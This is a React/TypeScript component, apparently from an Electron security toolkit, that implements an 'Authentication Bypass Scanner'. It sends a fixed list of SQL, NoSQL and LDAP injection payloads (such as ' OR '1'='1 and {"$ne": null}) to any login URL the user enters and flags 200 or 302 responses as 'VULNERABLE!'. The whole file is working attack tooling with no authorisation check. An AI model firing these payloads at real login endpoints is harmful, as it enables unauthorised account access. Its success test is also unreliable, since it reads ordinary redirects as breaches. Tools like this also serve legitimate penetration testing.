import { useState } from 'react';
import { useStore } from '../../store/store';
import styles from './SharedTool.module.css';
import ToolWrapper from './ToolWrapper';
import { LockIcon, LoadingIcon } from '../common/Icons';

export default function AuthBypass() {
  const { addToolResult } = useStore();
  const [targetUrl, setTargetUrl] = useState('');
  const [results, setResults] = useState<Array<{ type: string; payload: string; status: string }>>(
    []
  );
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const bypassPayloads = [
    { type: 'SQL Injection', payload: "' OR '1'='1", param: 'username' },
    { type: 'SQL Injection', payload: "admin' --", param: 'username' },
    { type: 'SQL Injection', payload: "' OR 1=1 --", param: 'username' },
    { type: 'NoSQL Injection', payload: '{"$ne": null}', param: 'username' },
    { type: 'NoSQL Injection', payload: '{"$gt": ""}', param: 'password' },
    { type: 'LDAP Injection', payload: '*)(uid=*', param: 'username' },
    { type: 'LDAP Injection', payload: 'admin)(|(password=*', param: 'username' },
  ];

  const testBypass = async () => {
    if (!targetUrl.trim()) {
      setError('Target URL is required');
      return;
    }

    setLoading(true);
    setError(null);
    setResults([]);

    try {
      const found: Array<{ type: string; payload: string; status: string }> = [];

      for (const { type, payload, param } of bypassPayloads) {
        try {
          const body = type.includes('NoSQL')
            ? JSON.stringify({ [param]: JSON.parse(payload), password: 'test' })
            : JSON.stringify({ [param]: payload, password: 'test' });

          const result = await window.electronAPI.net.httpFetch(targetUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body,
            timeout: 5000,
          });

          const success = result.status === 200 || result.status === 302;
          found.push({
            type,
            payload,
            status: success ? 'VULNERABLE!' : `Blocked (${result.status})`,
          });
        } catch {
          found.push({ type, payload, status: 'Error/Blocked' });
        }

        await new Promise((resolve) => setTimeout(resolve, 200));
      }

      setResults(found);

      addToolResult({
        id: Date.now().toString(),
        toolName: 'Auth Bypass',
        timestamp: Date.now(),
        input: { targetUrl },
        output: found,
        success: true,
      });
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : 'Auth bypass test failed';
      setError(message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ToolWrapper
      title="Authentication Bypass Scanner"
      icon={<LockIcon />}
      description="Test authentication endpoints for bypass vulnerabilities"
    >
      <div className={styles.section}>
        <div className={styles.inputGroup}>
          <label className={styles.label}>Login Endpoint</label>
          <input
            type="text"
            className={styles.input}
            placeholder="https://example.com/api/login"
            value={targetUrl}
            onChange={(e) => setTargetUrl(e.target.value)}
          />
        </div>

        <div className={styles.buttonGroup}>
          <button className={styles.primaryBtn} onClick={testBypass} disabled={loading}>
            {loading ? (
              <>
                <LoadingIcon /> Testing...
              </>
            ) : (
              'Test Bypass'
            )}
          </button>
        </div>
      </div>

      {error && <div className={styles.errorBox}>{error}</div>}

      {loading && (
        <div className={styles.loadingBox}>
          <div className={styles.spinner}></div>
          <span>Testing authentication bypass...</span>
        </div>
      )}

      {results.length > 0 && (
        <div className={styles.resultBox}>
          <div className={styles.resultHeader}>
            <span className={styles.resultTitle}>Bypass Test Results</span>
          </div>
          {results.map((result, idx) => (
            <div key={idx} className={styles.resultItem}>
              <span style={{ color: '#00ffaa', fontFamily: 'var(--font-mono)' }}>
                {result.type}
              </span>
              <span style={{ color: '#666', fontSize: '11px', marginLeft: '10px' }}>
                {result.payload}
              </span>
              <span
                style={{
                  color: result.status.includes('VULNERABLE') ? '#ff4444' : '#888',
                  marginLeft: '10px',
                }}
              >
                {result.status}
              </span>
            </div>
          ))}
        </div>
      )}
    </ToolWrapper>
  );
}
